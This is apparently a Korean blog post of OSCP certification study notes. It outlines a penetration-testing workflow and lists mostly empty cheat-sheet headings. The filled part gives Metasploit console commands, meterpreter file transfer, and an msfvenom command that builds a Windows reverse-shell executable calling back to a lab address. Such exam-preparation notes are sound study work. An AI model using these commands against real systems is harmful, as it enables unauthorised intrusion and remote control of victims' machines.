---
layout: post
title: OSCP
subtitle: OSCP 자격증 시험 준비를 위한 정리
author: g3rm
categories: Certificate
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
  - Kali_Linux
  - Offsec
sidebar:
---
## Flow
기본적으로 [정보 수집 > 취약점 스캔 > 권한 상승 > 다른 머신 침투] 의 틀을 가지고 있다.   
> 주로 Nmap 선에서 끝나는 것 같지만, 수동 정보 수집도 중요하니 막힐 땐 최대한 정보를 모아야 한다.   

## CheatSheet
OSCP 자격증 공부를 하면서 자주 사용하는 명령어 정리
### Nmap
#### TCP & UDP Port Scan

#### NSE Use

### DNS Enum

### SMB Enum

### SMTP Enum

### SNMP Enum

### WEB
#### Gobuster

### Password
#### NTLM
#### HashCat

### Privilege Escalation
#### Window
##### Info Gather
##### Binary Hijacking
##### DLL Hijacking
##### Incorrect Path

#### Linux
##### Info Gather
##### Cron Jobs Abuse
##### Setuid Abuse
##### Sudo Abuse

##### Kernel Vuln Use

### Port Forwarding & Tunneling
#### Port Forwarding

#### SSH Tunneling
#### HTTP Tunneling
#### DNS Tunneling

### Metasploit
#### msfconsole
Nmap 및 공격 성공 시 얻는 세션 등 다양한 것들을 공유하여 사용할 수 있어 초기화 및 워크스페이스 생성 후 사용하는 것이 좋다.   

```Shell
# 초기화 및 접속
sudo msfdb (re)init
sudo systemctl enable postgresql
sudo msfconsole

# 워크스페이스 생성
workspace -a pen200

# Nmap 사용
db_nmap <기존 Nmap 옵션>
hosts
services

# 보조모듈 나열 exploits, payloads, auxiliary 등등 있음
show -h

# 검색
search type:<보조모듈> <검색어>
search type:auxiliary ssh
search Apache 2.4.49

# payload 검색
show payloads
set payloads <번호>

# 사용 및 세팅
use <번호>
show options
set <option> <value> / unset <option>
services -p 445 --rhosts # db_name으로 정보가 있다면 사용 가능
run

# 공격 성공하여 얻은 정보/세션들
creds
sessions / sessions -i <번호>

# meterpreter payload 이용 시
sysinfo
getuid
shell
channel -l
l<linux명령어> / lpwd / lcat ...
download <경로>
upload <칼리경로> <피해자경로>

# session background
Ctrl+z 
```

#### msfvenom
```shell
# payloads 리스트 출력
msfvenom -l payloads --platform windows --arch x64

# payload 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```